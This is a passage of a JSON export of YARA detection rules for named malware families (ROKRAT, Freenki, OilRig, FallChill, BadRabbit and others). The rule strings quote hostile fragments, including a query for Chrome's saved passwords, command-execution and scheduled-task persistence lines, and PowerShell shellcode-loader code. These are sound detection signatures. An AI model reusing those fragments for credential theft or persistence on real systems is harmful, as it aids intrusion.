\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n      date = \"2017-11-29 10:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetCurrenvackageId\" fullword ascii\n      $s2 = \"fghijklmnopq\" fullword ascii\n      $s3 = \"23456789:;<=>?@ABCDEFGHIJKLMNOPQ\" fullword ascii\n      $s4 = \"PMM/dd/y\" fullword ascii\n      $s5 = \"bad all\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-11-29 10:17:51","description":"Detects UBootRAT Dropper","minimum_yara":"1.7","name":"UBootRAT_Dropper_RID2D1C","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/","required_modules":[],"rule_hash":"ca9d065de135e2f1fee9f73c713423f0","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ROKRAT_Dropper_Nov17_RID2E19 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects dropper for ROKRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 11:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and pe.imphash ( ) == \"c6187b1b5f4433318748457719dd6f39\"\n}","date":"2017-11-28 11:00:01","description":"Detects dropper for ROKRAT malware","minimum_yara":"1.7","name":"ROKRAT_Dropper_Nov17_RID2E19","reference":"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html","required_modules":["pe"],"rule_hash":"0c0f26a803abe8b938036658a4078a24","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Freeenki_Infostealer_Nov17_RID310F : DEMO EXE FILE MAL T1003 T1085 {\n   meta:\n      description = \"Detects Freenki infostealer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 13:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"base64Encoded=\\\"TVqQAAMAAAAEAAAA\" ascii\n      $x2 = \"command =outFile &\\\" sysupdate\\\"\" fullword ascii\n      $x3 = \"outFile=sysDir&\\\"\\\\rundll32.exe\\\"\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Clients\\\\StartMenuInternet\\\\firefox.exe\\\\shell\\\\open\\\\command\" fullword wide\n      $s2 = \"c:\\\\TEMP\\\\CrashReports\\\\\" fullword ascii\n      $s3 = \"objShell.run command, 0, True\" fullword ascii\n      $s4 = \"sysDir = shell.ExpandEnvironmentStrings(\\\"%windir%\\\")\" fullword ascii\n      $s5 = \"'Wscript.echo \\\"Base64 encoded: \\\" + base64Encoded\" fullword ascii\n      $s6 = \"set shell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n      $a1 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n      $a2 = \"SELECT username_value, password_value, signon_realm FROM logins\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of them or all of ( $a* ) )\n}","date":"2017-11-28 13:06:21","description":"Detects Freenki infostealer malware","minimum_yara":"1.7","name":"Freeenki_Infostealer_Nov17_RID310F","reference":"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html","required_modules":[],"rule_hash":"28764c814be94b3da5eaf30f035369ba","score":75,"tags":["MAL","DEMO","T1003","FILE","T1085","EXE"]},{"author":"Florian Roth","content":"rule Freeenki_Infostealer_Nov17_Export_Sig_Testing_RID38AF : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Freenki infostealer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 18:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and pe.exports ( \"getUpdate\" ) and pe.number_of_exports == 1\n}","date":"2017-11-28 18:31:41","description":"Detects Freenki infostealer malware","minimum_yara":"1.7","name":"Freeenki_Infostealer_Nov17_Export_Sig_Testing_RID38AF","reference":"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html","required_modules":["pe"],"rule_hash":"2a1076aa339cba5051d57714c4923699","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ROKRAT_Nov17_1_RID2B6E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ROKRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-11-28 09:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\T+M\\\\Result\\\\DocPrint.pdb\" ascii\n      $s2 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\" ascii\n      $s3 = \"e:\\\\Happy\\\\Work\\\\Source\\\\version\" ascii\n      $x1 = \"\\\\appdata\\\\local\\\\svchost.exe\" ascii\n      $x2 = \"c:\\\\temp\\\\esoftscrap.jpg\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of them )\n}","date":"2017-11-28 09:06:11","description":"Detects ROKRAT malware","minimum_yara":"1.7","name":"ROKRAT_Nov17_1_RID2B6E","reference":"Internal Research","required_modules":[],"rule_hash":"e6ca51add94e378794045665634a8b3e","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_Nov17_1_RID2FF2 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Greenbug Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/greenbug/\"\n      date = \"2017-11-26 12:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AgentV2.exe  -c  SampleDomain.com\" fullword ascii\n      $x2 = \".ntpupdateserver.com\" fullword ascii\n      $x3 = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"a.a\\\"\" fullword ascii\n      $x4 = \"a67d0db885a3432576548a2a03707334\" fullword ascii\n      $x5 = \"a67d0db8a2a173347654432503702aa3\" fullword ascii\n      $x6 = \"!!! can not create output file !!!\" fullword ascii\n      $s1 = \"\\\\runlog*\" fullword ascii\n      $s2 = \"can not specify username!!\" fullword ascii\n      $s3 = \"Agent can not be configured\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"58ba44f7ff5436a603fec3df97d815ea\" or pe.imphash ( ) == \"538805ecd776b9a42e71aebf94fde1b1\" or 1 of ( $x* ) or 3 of them )\n}","date":"2017-11-26 12:18:51","description":"Detects Greenbug Malware","minimum_yara":"1.7","name":"Greenbug_Malware_Nov17_1_RID2FF2","reference":"http://www.clearskysec.com/greenbug/","required_modules":["pe"],"rule_hash":"14db750969640a3ab8494229acbef741","score":75,"tags":["DEMO","EXE","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Nov17_13_RID2F3C : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects OilRig DNSCat malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/933280188733018113\"\n      date = \"2017-11-22 11:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\dnscat2.pdb\" ascii\n      $x2 = \"cscript.exe //T:20 //Nologo \" fullword ascii\n      $a1 = \"taskkill /F /IM cscript.exe\" fullword ascii\n      $a2 = \"cmd.exe /c \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"0160250adfc97f9d4a12dd067323ec61\" or 1 of ( $x* ) or all of ( $a* ) )\n}","date":"2017-11-22 11:48:31","description":"Detects OilRig DNSCat malware","minimum_yara":"1.7","name":"OilRig_Malware_Nov17_13_RID2F3C","reference":"https://twitter.com/ClearskySec/status/933280188733018113","required_modules":["pe"],"rule_hash":"029d2c887abf23646b20946ecda132b9","score":75,"tags":["DEMO","EXE","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule Volgmer_Malware_RID2D15 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Volgmer malware as reported in US CERT TA17-318B\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-318B\"\n      date = \"2017-11-15 10:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"User-Agent: Mozillar/5.0\" fullword ascii\n      $x2 = \"[Cmd] - CMD_BOTCMD_CONNLOG_GET\" fullword wide\n      $x3 = \"[TestConnect To Bot] - Port = %d\" fullword ascii\n      $x4 = \"b50a338264226b6d57c1936d9db140ba74a28930270a083353645a9b518661f4fcea160d7\" ascii\n      $s1 = \"%sigfx%c%c%c.exe\" fullword wide\n      $s2 = \"H_%s_%016I64X_%04d%02d%02d%02d%02d%02d.TXT\" fullword ascii\n      $s3 = \"cmd.exe /c %s > %s 2>&1\" fullword wide\n      $s4 = \"%s\\\\dllcache\\\\%s.dll\" fullword ascii\n      $s5 = \"Cond Fail.\" fullword ascii\n      $s6 = \"The %s %s%s\" fullword ascii\n      $s7 = \"%s \\\"%s\\\"%s \\\"%s\\\" %s \\\"%s\\\"\" fullword ascii\n      $s8 = \"DLL_Spider.dll\" fullword ascii\n   condition: \n      filesize < 400KB and ( 1 of ( $x* ) or ( uint16 ( 0 ) == 0x5a4d and 2 of them ) ) or ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"ea42395e901b33bad504798e0f0fd74b\" )\n}","date":"2017-11-15 10:16:41","description":"Detects Volgmer malware as reported in US CERT TA17-318B","minimum_yara":"1.7","name":"Volgmer_Malware_RID2D15","reference":"https://www.us-cert.gov/ncas/alerts/TA17-318B","required_modules":["pe"],"rule_hash":"1cf972d589090c8e8f25a6425a7d098b","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule HiddenCobra_FallChill_1_RID2F9E : APT DEMO EXE FILE NK T1117 {\n   meta:\n      description = \"Semiautomatic generated rule - file a606716355035d4a1ea0b15f3bee30aad41a2c32df28c2d468eafd18361d60d6\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\n      date = \"2017-11-15 12:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK, T1117\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"REGSVR32.EXE.MUI\" fullword wide\n      $s2 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s3 = \"c%sd.e%sc %s > \\\"%s\\\" 2>&1\" fullword wide\n      $s4 = \"\\\" goto Loop\" fullword ascii\n      $e1 = \"xolhvhlxpvg\" fullword ascii\n      $e2 = \"tvgslhgybmanv\" fullword ascii\n      $e3 = \"CivagvTllosvok32Smakhslg\" fullword ascii\n      $e4 = \"GvgCfiivmgDrivxglibW\" fullword ascii\n      $e5 = \"OkvmPilxvhhTlpvm\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"6135d9bc3591ae7bc72d070eadd31755\" or 3 of ( $s* ) or 4 of them )\n}","date":"2017-11-15 12:04:51","description":"Semiautomatic generated rule - file a606716355035d4a1ea0b15f3bee30aad41a2c32df28c2d468eafd18361d60d6","minimum_yara":"1.7","name":"HiddenCobra_FallChill_1_RID2F9E","reference":"https://www.us-cert.gov/ncas/alerts/TA17-318A","required_modules":["pe"],"rule_hash":"7ab0d825c7e039bbba73d37ee0194a20","score":75,"tags":["NK","DEMO","EXE","FILE","APT","T1117"]},{"author":"Florian Roth","content":"rule HiddenCobra_FallChill_2_RID2F9F : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Semiautomatic generated rule - file 0a118eb23399000d148186b9079fa59caf4c3faa7e7a8f91533e467ac9b6ff41\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\n      date = \"2017-11-15 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\%s.dll\" fullword wide\n      $s2 = \"yurdkr.dll\" fullword ascii\n      $s3 = \"c%sd.e%sc %s > \\\"%s\\\" 2>&1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"cb36dcb9909e29a38c387b8a87e7e4ed\" or ( 2 of them ) )\n}","date":"2017-11-15 12:05:01","description":"Semiautomatic generated rule - file 0a118eb23399000d148186b9079fa59caf4c3faa7e7a8f91533e467ac9b6ff41","minimum_yara":"1.7","name":"HiddenCobra_FallChill_2_RID2F9F","reference":"https://www.us-cert.gov/ncas/alerts/TA17-318A","required_modules":["pe"],"rule_hash":"c3f6bc1bd7e8678b9bc54e518cd3be8b","score":75,"tags":["APT","DEMO","EXE","FILE","NK"]},{"author":"Florian Roth","content":"rule Reaver3_Malware_Nov17_1_RID2F5B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CPL.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"e722dd50a0e2bc0cab8ca35fc4bf6d99\" and all of them )\n}","date":"2017-11-11 11:53:41","description":"Detects Reaver malware mentioned in PaloAltoNetworks report","minimum_yara":"1.7","name":"Reaver3_Malware_Nov17_1_RID2F5B","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/","required_modules":["pe"],"rule_hash":"fbcef4eef2ca404c6e0e1cc8afe4bed2","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Reaver3_Malware_Nov17_2_RID2F5C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WindowsUpdateReaver\" fullword wide\n      $s1 = \"\\\\WUpdate.~tmp\" fullword ascii\n      $s2 = \"\\\\~WUpdate.lnk\" fullword ascii\n      $s3 = \"\\\\services\\\\\" fullword ascii\n      $s4 = \"moomjufps\" fullword ascii\n      $s5 = \"gekmomkege\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"837cc5062a0758335b257ea3b27972b2\" or 1 of ( $x* ) or 3 of them )\n}","date":"2017-11-11 11:53:51","description":"Detects Reaver malware mentioned in PaloAltoNetworks report","minimum_yara":"1.7","name":"Reaver3_Malware_Nov17_2_RID2F5C","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/","required_modules":["pe"],"rule_hash":"575c1a0f94a4dd2f4e92cbe404a4531d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Reaver3_Malware_Nov17_3_RID2F5D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 11:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"winhelp.dat\" fullword ascii\n      $s2 = \"\\\\microsoft\\\\Credentials\\\\\" fullword ascii\n      $s3 = \"~Update.lnk\" fullword ascii\n      $s4 = \"winhelp.cpl\" fullword ascii\n      $s5 = \"\\\\services\\\\\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"8ee521b2316ddd6af1679eac9f5ed77b\" or 4 of them )\n}","date":"2017-11-11 11:54:01","description":"Detects Reaver malware mentioned in PaloAltoNetworks report","minimum_yara":"1.7","name":"Reaver3_Malware_Nov17_3_RID2F5D","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/","required_modules":["pe"],"rule_hash":"5f2b493c3894a32b50d6156ac2ceb061","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SunOrcal_Malware_Nov17_1_RID2FEA : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Reaver malware mentioned in PaloAltoNetworks report\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n      date = \"2017-11-11 12:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"kQZ6l5t1kAlsjmBzsCZPrSpQn5tFrChLtTdsgTlOsClKt5pBsDdFrSVshnxMr6ZOpn9slndBsy1jq6lIr216rSNApn9P\" fullword ascii\n      $x2 = { 00 00 00 00 00 00 00 00 00 00 00 00 21 21 21 73\n              79 73 74 65 6D 00 00 00 00 00 00 00 00 00 00 00 } \n      $x3 = \"!!!url!!!\" fullword ascii\n      $x4 = \"h4NcbkdLrCpFpPQ=\" fullword ascii\n      $x5 = \"GloablCryptNv1\" fullword ascii\n      $x6 = \"Gloabl\\\\CryptNv1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}","date":"2017-11-11 12:17:31","description":"Detects Reaver malware mentioned in PaloAltoNetworks report","minimum_yara":"1.7","name":"SunOrcal_Malware_Nov17_1_RID2FEA","reference":"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/","required_modules":[],"rule_hash":"67205f071c60516398227ad1733a7134","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Daserf_Nov1_BronzeButler_RID3066 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Daserf malware used by Bronze Butler\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/ffeCfd\"\n      date = \"2017-11-08 12:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"mstmp1845234.exe\" fullword ascii\n      $x2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\" fullword ascii\n      $x3 = \"Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\" fullword ascii\n      $s1 = \"Content-Type: */*\" fullword ascii\n      $s2 = \"ProxyEnable\" ascii fullword\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\" ascii fullword\n      $s4 = \"iexplore.exe\" ascii fullword\n      $s5 = \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Cu\" fullword ascii\n      $s6 = \"rrentVersion\\\\Internet Settings\" fullword ascii\n      $s7 = \"ws\\\\CurrentVersion\\\\Inter\" fullword ascii\n      $s8 = \"Documents an\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 5 of them )\n}","date":"2017-11-08 12:38:11","description":"Detects Daserf malware used by Bronze Butler","minimum_yara":"1.7","name":"Daserf_Nov1_BronzeButler_RID3066","reference":"https://goo.gl/ffeCfd","required_modules":[],"rule_hash":"1a2e59a16103002c417ebd9405777a79","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CrunchRAT_RID2A5B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CrunchRAT_RID2A5B - file CrunchRAT_RID2A5B.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/t3ntman/CrunchRAT_RID2A5B\"\n      date = \"2017-11-03 05:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"----CrunchRAT_RID2A5B\" fullword wide\n      $x2 = \"\\\\Debug\\\\CrunchRAT_RID2A5B\" ascii\n      $x3 = \"\\\\Release\\\\CrunchRAT_RID2A5B\" ascii\n      $s1 = \"runCommand\" fullword ascii\n      $s2 = \"<action>download<action>\" fullword wide\n      $s3 = \"Content-Disposition: form-data; name=action\" fullword wide\n      $s4 = \"<action>upload<action>\" fullword wide\n      $s5 = \"/update.php\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and 3 of them )\n}","date":"2017-11-03 05:23:21","description":"Detects CrunchRAT - file CrunchRAT.exe","minimum_yara":"1.7","name":"CrunchRAT_RID2A5B","reference":"https://github.com/t3ntman/CrunchRAT","required_modules":[],"rule_hash":"2f44455075167c17b144dc3a70b2f094","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PowerShell_Mal_HackTool_Gen_RID317C : DEMO GEN HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects PowerShell hack tool samples - generic PE loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-11-02 13:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$PEBytes32 = 'TVqQAAMAAAAEAAAA\" wide\n      $x2 = \"Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp\" fullword wide\n      $x3 = \"@($PEBytes64, $PEBytes32, \\\"Void\\\", 0, \\\"\\\", $ExeArgs)\" fullword wide\n      $x4 = \"(Shellcode: LoadLibraryA.asm)\" fullword wide\n   condition: \n      filesize < 8000KB and 1 of them\n}","date":"2017-11-02 13:24:31","description":"Detects PowerShell hack tool samples - generic PE loader","minimum_yara":"1.7","name":"PowerShell_Mal_HackTool_Gen_RID317C","reference":"Internal Research","required_modules":[],"rule_hash":"111886d3511eeef5dff5e328bd686135","score":75,"tags":["GEN","DEMO","T1086","SCRIPT","HKTL"]},{"author":"Florian Roth","content":"rule Silence_malware_1_RID2DAC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample mentioned in the Silence report on Securelist\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/the-silence/83009/\"\n      date = \"2017-11-01 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"adobeudp.exe\" fullword wide\n      $x2 = \"%s\\\\adobeudp.exeZone.Identifier\" fullword ascii\n      $x3 = \"%s\\\\igfxpers_%08x.exe\" fullword ascii\n      $x4 = \"%s\\\\adobeudp.exe\" fullword ascii\n      $s1 = \"SoftWare\\\\MicroSoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword ascii\n      $s2 = \"Copyright (C)  1999 - 2017\" fullword wide\n      $s3 = \"%sget.php?name=%x\" fullword ascii\n      $s4 = \"VNASSRUNXYC\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"e03edb9bd7cbe200dc59f361db847f8a\" or 1 of ( $x* ) or 3 of them )\n}","date":"2017-11-01 10:41:51","description":"Detects malware sample mentioned in the Silence report on Securelist","minimum_yara":"1.7","name":"Silence_malware_1_RID2DAC","reference":"https://securelist.com/the-silence/83009/","required_modules":["pe"],"rule_hash":"2fe00228c7f61644ae594898b5275219","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Silence_malware_2_RID2DAD : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware sample mentioned in the Silence report on Securelist\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/the-silence/83009/\"\n      date = \"2017-11-01 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\ScreenMonitorService\\\\Release\\\\smmsrv.pdb\" ascii\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\" fullword ascii\n      $s1 = \"My Sample Service: ServiceMain: SetServiceStatus returned error\" fullword ascii\n      $s2 = \"\\\\mss.exe\" fullword ascii\n      $s3 = \"\\\\out.dat\" fullword ascii\n      $s4 = \"\\\\mss.txt\" fullword ascii\n      $s5 = \"Default monitor\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"69f3ec173efb6fd3ab5f79e0f8051335\" or ( 1 of ( $x* ) or 3 of them ) ) ) or ( 5 of them )\n}","date":"2017-11-01 10:42:01","description":"Detects malware sample mentioned in the Silence report on Securelist","minimum_yara":"1.7","name":"Silence_malware_2_RID2DAD","reference":"https://securelist.com/the-silence/83009/","required_modules":["pe"],"rule_hash":"e38f1402a1263a17e0cac05cba23f1b9","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule BadRabbit_Gen_RID2BE5 : CRIME DEMO EXE FILE GEN MAL RANSOM T1050 T1053 T1085 {\n   meta:\n      description = \"Detects BadRabbit Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://pastebin.com/Y7pJv3tK\"\n      date = \"2017-10-25 09:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, GEN, MAL, RANSOM, T1050, T1053, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"schtasks /Create /SC ONCE /TN viserion_%u /RU SYSTEM /TR \\\"%ws\\\" /ST\" fullword wide\n      $x2 = \"schtasks /Create /RU SYSTEM /SC ONSTART /TN 